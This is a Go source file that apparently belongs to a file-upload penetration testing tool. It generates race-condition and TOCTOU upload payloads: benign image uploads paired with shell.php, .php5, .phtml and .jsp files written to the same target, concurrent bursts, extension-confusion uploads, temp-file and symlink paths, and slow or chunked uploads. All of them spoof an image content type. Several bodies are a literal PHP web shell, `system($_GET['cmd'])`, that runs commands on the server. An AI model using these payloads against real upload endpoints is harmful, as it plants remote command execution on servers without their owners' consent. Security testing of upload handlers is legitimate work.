package payload

import (
	"fmt"
	"sync"
)

// RaceBarrier is used to synchronize concurrent race condition payloads
type RaceBarrier struct {
	mu    sync.Mutex
	group map[string][]*Payload // payloads grouped by target filename
	ready chan struct{}         // signals when all payloads in a group are ready
}

// NewRaceBarrier creates a synchronization barrier for race condition tests
func NewRaceBarrier() *RaceBarrier {
	return &RaceBarrier{
		group: make(map[string][]*Payload),
		ready: make(chan struct{}),
	}
}

// AddPayload adds a payload to its filename group
func (rb *RaceBarrier) AddPayload(p *Payload) {
	rb.mu.Lock()
	defer rb.mu.Unlock()
	
	key := p.TargetFilename
	if key == "" {
		key = p.Filename
	}
	rb.group[key] = append(rb.group[key], p)
}

// GetGroup returns all payloads for a given target filename
func (rb *RaceBarrier) GetGroup(targetFile string) []*Payload {
	rb.mu.Lock()
	defer rb.mu.Unlock()
	return rb.group[targetFile]
}

// SignalReady signals that all payloads are prepared
func (rb *RaceBarrier) SignalReady() {
	close(rb.ready)
}

// WaitReady waits for the ready signal
func (rb *RaceBarrier) WaitReady() {
	<-rb.ready
}

// moduleRace generates Race Condition / TOCTOU test payloads.
func moduleRace() []*Payload {
	var tests []*Payload

	// Test 1: Same filename, benign first then malicious
	racePairs := []struct {
		benignName    string
		maliciousName string
		targetFile    string // The actual file that gets written (same for both)
		technique     string
	}{
		{
			benignName:    "race_benign.jpg",
			maliciousName: "race_shell.php",
			targetFile:    "race_target.php",
			technique:     "TOCTOU: Check .jpg, then write .php to same target",
		},
		{
			benignName:    "race_benign.png",
			maliciousName: "race_shell.php5",
			targetFile:    "race_target.php5",
			technique:     "TOCTOU: Check .png, then write .php5 to same target",
		},
		{
			benignName:    "race_benign.gif",
			maliciousName: "race_shell.phtml",
			targetFile:    "race_target.phtml",
			technique:     "TOCTOU: Check .gif, then write .phtml to same target",
		},
		{
			benignName:    "race_benign.pdf",
			maliciousName: "race_shell.jsp",
			targetFile:    "race_target.jsp",
			technique:     "TOCTOU: Check .pdf, then write .jsp to same target",
		},
	}

	for _, pair := range racePairs {
		// Benign payload (passes extension check)
		benignContent := []byte(fmt.Sprintf("GIF89a// BENIGN RACE TEST - Should pass validation"))
		tests = append(tests, &Payload{
			TestType:       TestTypeRaceCondition,
			Technique:      "Benign: " + pair.technique,
			Filename:       pair.benignName,
			TargetFilename: pair.targetFile, // Both write to same target
			Extension:      extractExtension(pair.benignName),
			Body:           benignContent,
			ContentType:    "image/jpeg",
			Tags:           []string{"race-condition", "toc-tou", "benign"},
		})

		// Malicious payload (should be blocked by extension check, but overwrites target)
		maliciousContent := getPayloadForExtension(extractExtension(pair.maliciousName))
		tests = append(tests, &Payload{
			TestType:       TestTypeRaceCondition,
			Technique:      "Malicious: " + pair.technique,
			Filename:       pair.maliciousName,
			TargetFilename: pair.targetFile, // Same target as benign
			Extension:      extractExtension(pair.maliciousName),
			Body:           maliciousContent,
			ContentType:    "image/jpeg",
			Tags:           []string{"race-condition", "toc-tou", "malicious"},
		})
	}

	// Test 2: Concurrent uploads with identical filenames (burst test)
	concurrentFiles := []struct {
		filename   string
		technique  string
	}{
		{"concurrent_test.php", "Concurrent burst: 3 simultaneous uploads of same filename"},
		{"concurrent_config.json", "Concurrent burst: config file race"},
		{"concurrent_data.xml", "Concurrent burst: XML data race"},
	}

	for _, cf := range concurrentFiles {
		for i := 0; i < 3; i++ {
			body := []byte(fmt.Sprintf("<?php system($_GET['cmd']); /* RACE_BURST_%d */ ?>", i))
			tests = append(tests, &Payload{
				TestType:       TestTypeRaceCondition,
				Technique:      fmt.Sprintf("%s (#%d)", cf.technique, i+1),
				Filename:       cf.filename,
				TargetFilename: cf.filename,
				Extension:      extractExtension(cf.filename),
				Body:           body,
				ContentType:    "image/jpeg",
				Tags:           []string{"race-condition", "concurrent", "burst", "same-filename"},
				RaceSync:       true, // Mark for synchronized execution
			})
		}
	}

	// Test 3: Extension confusion race (FIXED - checkName used properly)
	// Server checks extension from one source, saves with extension from another
	extensionRaceTests := []struct {
		checkExt  string // Extension the server validates against
		saveName  string // Actual filename saved to disk
		technique string
	}{
		{".jpg", "shell.php", "Extension race: Validate .jpg, save as .php"},
		{".png", "shell.php5", "Extension race: Validate .png, save as .php5"},
		{".gif", "shell.phtml", "Extension race: Validate .gif, save as .phtml"},
		{".pdf", "shell.jsp", "Extension race: Validate .pdf, save as .jsp"},
	}

	for _, ext := range extensionRaceTests {
		body := getPayloadForExtension(extractExtension(ext.saveName))
		tests = append(tests, &Payload{
			TestType:    TestTypeRaceCondition,
			Technique:   ext.technique,
			Filename:    fmt.Sprintf("check%s", ext.checkExt), // Filename for validation
			TargetFilename: ext.saveName,                       // Actual save target
			Extension:   ext.checkExt,                          // Extension the server checks
			Body:        body,
			ContentType: "image/jpeg",
			Tags:        []string{"race-condition", "extension-confusion", "dual-source"},
		})
	}

	// Test 4: Temp file race
	tempRaceNames := []string{
		"/tmp/upload_123.php",
		"/tmp/phpABC123",
		"/var/tmp/shell.php5",
		"/dev/shm/exploit.phtml",
	}

	for _, tempName := range tempRaceNames {
		body := getPayloadForExtension(extractExtension(tempName))
		tests = append(tests, &Payload{
			TestType:       TestTypeRaceCondition,
			Technique:      fmt.Sprintf("Temp file race: %s", tempName),
			Filename:       tempName,
			TargetFilename: tempName,
			Extension:      extractExtension(tempName),
			Body:           body,
			Tags:           []string{"race-condition", "temp-file", "predictable-path"},
		})
	}

	// Test 5: Symbolic link race
	symlinkTests := []struct {
		filename  string
		technique string
	}{
		{"upload_link.php", "Symlink race: upload to linked file"},
		{"proc_self_fd.php", "Symlink race: /proc/self/fd/ target"},
		{"dev_stdout.php", "Symlink race: /dev/stdout target"},
	}

	for _, sym := range symlinkTests {
		tests = append(tests, &Payload{
			TestType:       TestTypeRaceCondition,
			Technique:      sym.technique,
			Filename:       sym.filename,
			TargetFilename: sym.filename,
			Extension:      ".php",
			Body:           phpWebshell,
			Tags:           []string{"race-condition", "symlink", "filesystem"},
		})
	}

	// Test 6: Time-window exploitation
	timeWindowTests := []struct {
		filename  string
		delay     string
		technique string
	}{
		{"slow_upload.php", "slow", "Slow upload: exploit processing time gap"},
		{"large_race.php", "large", "Large file: exploit I/O time gap"},
		{"chunked_race.php", "chunked", "Chunked upload: exploit reassembly gap"},
	}

	for _, tw := range timeWindowTests {
		tests = append(tests, &Payload{
			TestType:       TestTypeRaceCondition,
			Technique:      tw.technique,
			Filename:       tw.filename,
			TargetFilename: tw.filename,
			Extension:      ".php",
			Body:           phpWebshell,
			Tags:           []string{"race-condition", "time-window", tw.delay},
		})
	}

	return tests
}
